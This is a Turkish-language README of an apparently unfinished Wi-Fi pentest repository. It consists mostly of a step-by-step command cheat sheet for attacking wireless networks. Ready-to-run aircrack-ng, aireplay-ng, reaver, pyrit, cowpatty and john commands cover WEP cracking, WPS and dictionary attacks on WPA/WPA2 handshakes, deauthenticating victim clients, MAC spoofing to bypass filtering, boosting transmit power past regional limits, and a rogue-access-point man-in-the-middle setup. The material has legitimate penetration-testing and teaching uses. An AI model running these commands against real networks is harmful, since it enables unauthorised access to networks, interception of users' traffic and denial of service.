Bu Reponun amacı Wi-Fi Pentestlerini otomotize bir hale getirmek için oluşturulmuş bir Repo'dur. Amaç; hem bir not defteri olarak kullanmak hem de eksik görülen yerleri eklemektir. Proje hala daha "geliştirilme aşamasında" olup henüz tam olarak çalışmamaktadır. Olması hedeflenen saldırı türleri;

- Coffe - Latte Attack
- Deauthentication Attack (Stress Testing)
- PMKID Attack
- SSL MITM Attack
- Korek's Chop Chop Attack
- Fragmantation And Hitre Attack
- Hotsopt Attack
- Detecting AP Spoffing
- Detecting AP MAC Spoffing
- WPA/WPA2/WEB Capture Handshake
- Control Wi-Fi Card

------------------------------------------------------------
Monitoring

root@mert:~# airmon-ng check kill

monitor mod on

root@mert:~# ifconfig wlan0 down
root@mert:~# airmon-ng start wlan0
//hata verirse bekle tekrar dene
//iwconfig wlan0 mode monitor
//use wlan0 instead of wlan0mon
root@mert:~# ifconfig wlan0 up
---------------------------------------------------------------------------------------
Increase Wi-Fi TX Power

root@mert:~# iw reg set B0
root@mert:~# iwconfig wlan0 txpower <NmW|NdBm|off|auto>
#txpower is 30 (generally)
#txpower is depends your country, please googling
root@mert:~iwconfig
----------------------------------------------------------------------------------------------

Change WiFi Channel #wifi çanıl seç
root@mert:~# iwconfig wlan0 channel <SetChannel(1-14)>
--------------------------------------------------------------------------------------------


WEP CRACKING
 Method 1 : Fake Authentication Attack #sahte atak
root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#MAC adresim ne?
root@mert:~# macchanger --show wlan0mon

root@mert:~# aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> wlan0mon
root@mert:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <OurMac> wlan0mon
root@mert:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>



Method 2 : ARP Replay Attack #arp atak

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#MAC Adresim ne hacı?
root@mert:~# macchanger --show wlan0mon
root@mert:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> wlan0mon
root@mert:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>



Method 3 : Chop Chop Attack  #!!!!!!mantığını araştır ve anla bunu!!!!!!

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#MAC Adresim ne hacı?
root@mert:~# macchanger --show wlan0mon
root@mert:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
root@mert:~# aireplay-ng -4 –b <BSSID> -h <OurMac> wlan0mon
root@mert:~# packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
root@mert:~# aireplay-ng -2 –r <FileName2> wlan0mon
root@mert:~# aircrack-ng <PCAP_of_FileName>




Method 4 : Fragmentation Attack

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
#MAC Adresim ne hacı?
root@mert:~# macchanger --show wlan0mon
root@mert:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> wlan0mon
root@mert:~# aireplay-ng -5 –b<BSSID> -h < OurMac > wlan0mon
#Press ‘y’ ;
root@mert:~# packetforge-ng -0 –a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
root@mert:~# aireplay-ng -2 –r <FileName2> wlan0mon
root@mert:~# aircrack-ng <PCAP_of_FileName>




Method 5 : SKA (Shared Key Authentication) Type Cracking

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# ifconfig wlan0mon down
root@mert:~# macchanger –-mac <VictimMac> wlan0mon
root@mert:~# ifconfig wlan0mon up
root@mert:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon
root@mert:~# aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> wlan0mon
root@mert:~# aircrack-ng <PCAP_of_FileName>
----------------------------------------------------------------------------------------------------------


WPA / WPA2 CRACKING
Method 1 : WPS Attack

root@mert:~# airmon-ng start wlan0
root@mert:~# apt-get install reaver
root@mert:~# wash –i wlan0mon 
root@mert:~# reaver –i wlan0mon –b <BSSID> -vv –S
#or, Specific attack
root@mert:~# reaver –i wlan0mon –c <Channel> -b <BSSID> -p <PinCode> -vv –S



Method 2 : Dictionary Attack #mantığını kavra!!!!

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>




Method 3 : Crack with John The Ripper #en son işlem. Gerekliliğini araştır****

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# cd /pentest/passwords/john
root@mert:~# ./john –wordlist=<Wordlist> --rules –stdout|aircrack-ng -0 –e <ESSID> -w - <PCAP_of_FileName>
#or
root@mert:~# aircrack-ng <FileName>.cap -J <outFile>
root@mert:~# hccap2john <outFile>.hccap > <JohnOutFile>
root@mert:~# john <JohnOutFile>



Method 4 : Crack with coWPAtty #bunu hiç bilmiyon. Kesinlikle bak.....!!!

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# cowpatty –r <FileName> -f <Wordlist> -2 –s <SSID>
root@mert:~# genpmk –s <SSID> –f <Wordlist> -d <HashesFileName>
root@mert:~# cowpatty –r <PCAP_of_FileName> -d <HashesFileName> -2 –s <SSID>




Method 5 : Crack with Pyrit

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# pyrit –r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
root@mert:~# pyrit –i <Wordlist> import_passwords
root@mert:~# pyrit –e <ESSID> create_essid
root@mert:~# pyrit batch
root@mert:~# pyrit –r <PCAP_of_FileName> attack_db




Method 6 : Precomputed WPA Keys Database Attack

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# kwrite ESSID.txt
root@mert:~# airolib-ng NEW_DB --import essid ESSID.txt
root@mert:~# airolib-ng NEW_DB --import passwd <DictionaryFile>
root@mert:~# airolib-ng NEW_DB --clean all
root@mert:~# airolib-ng NEW_DB --stats
root@mert:~# airolib-ng NEW_DB --batch
root@mert:~# airolib-ng NEW_DB --verify all
root@mert:~# aircrack-ng –r NEW_DB <Handshaked_PCAP>

-----------------------------------------------------------------------------------
FIND HIDDEN SSID

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <Channel> --bssid <BSSID> wlan0mon
root@mert:~# aireplay-ng -0 20 –a <BSSID> -c <VictimMac> wlan0mon


-------------------------------------------------------------------------------------
BYPASS MAC FILTERING
#klasik işlemler. Unutmamak için koydum. Ama yine de bak!!

root@mert:~# airmon-ng start wlan0
root@mert:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> wlan0mon
root@mert:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> wlan0mon
root@mert:~# ifconfig wlan0mon down
root@mert:~# macchanger –-mac <VictimMac> wlan0mon
root@mert:~# ifconfig wlan0mon up
root@mert:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> wlan0mon

--------------------------------------------------------------------------------------------------

MAN IN THE MIDDLE ATTACK

root@mert:~# airmon-ng start wlan0
root@mert:~# airbase-ng –e “<FakeBSSID>” wlan0mon
#apt-get install bridge-utils #bunu netten buldum. Gerekliliğini araştır. Ama sorun çözüyor...
root@mert:~# brctl addbr <VariableName>
root@mert:~# brctl addif <VariableName> wlan0mon
root@mert:~# brctl addif <VariableName> at0
root@mert:~# ifconfig eth0 0.0.0.0 up
root@mert:~# ifconfig at0 0.0.0.0 up
root@mert:~# ifconfig <VariableName> up
root@mert:~# aireplay-ng –deauth 0 –a <victimBSSID> wlan0mon
root@mert:~# dhclient3 <VariableName> &
root@mert:~# wireshark &
;select <VariableName> interface
